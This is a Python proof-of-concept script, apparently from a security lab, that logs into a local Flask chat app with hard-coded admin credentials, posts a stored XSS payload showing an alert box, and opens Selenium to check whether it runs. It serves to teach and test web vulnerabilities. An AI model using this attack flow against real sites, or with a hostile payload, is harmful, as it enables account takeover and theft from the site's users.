"""
This script demonstrates an XSS (Cross-Site Scripting) attack on a vulnerable Flask web application.
It logs in as a user, sends an XSS payload to the chat system, and then uses Selenium to check if the payload is executed.

Usage:
1. Ensure the Flask server is running.
2. Run this script to perform the XSS attack.

Security Warning:
This script is for educational purposes only. Do not use it on any system without explicit permission.
"""

import requests
from selenium import webdriver
import time

# Target Flask server
BASE_URL = "http://127.0.0.1:5000"  # Change to your Flask server address
XSS_PAYLOAD = '<script>alert("XSS Attack!");</script>'

USERNAME = "admin"
PASSWORD = "admin123"

session = requests.Session()

def login():
    """Log in the user and obtain session cookie"""
    login_url = f"{BASE_URL}/login"
    login_data = {"username": USERNAME, "password": PASSWORD}
    response = session.post(login_url, data=login_data)
    
    if response.status_code == 200:
        print("[+] Login successful, session cookie obtained")
    else:
        print("[-] Login failed")
        exit()

def send_xss():
    """Send XSS payload to the Flask chat system"""
    chat_url = f"{BASE_URL}/"
    message_data = {"content": XSS_PAYLOAD}
    response = session.post(chat_url, data=message_data)

    if response.status_code == 200:
        print("[+] XSS payload sent successfully! Check the target page to see if the JavaScript code executes.")
    else:
        print("[-] Failed to send XSS payload!")
        exit()

def check_xss():
    """Open the browser to check if XSS executes"""
    print("[+] Launching browser...")
    
    # Launch Selenium browser
    driver = webdriver.Chrome()
    driver.get(BASE_URL)  # Open the chat page
    
    # Wait for 5 seconds to observe if XSS executes
    time.sleep(5)

    # Close the browser
    driver.quit()
    print("[+] Browser closed. Check if an alert dialog appeared.")

if __name__ == "__main__":
    login()
    send_xss()
    check_xss()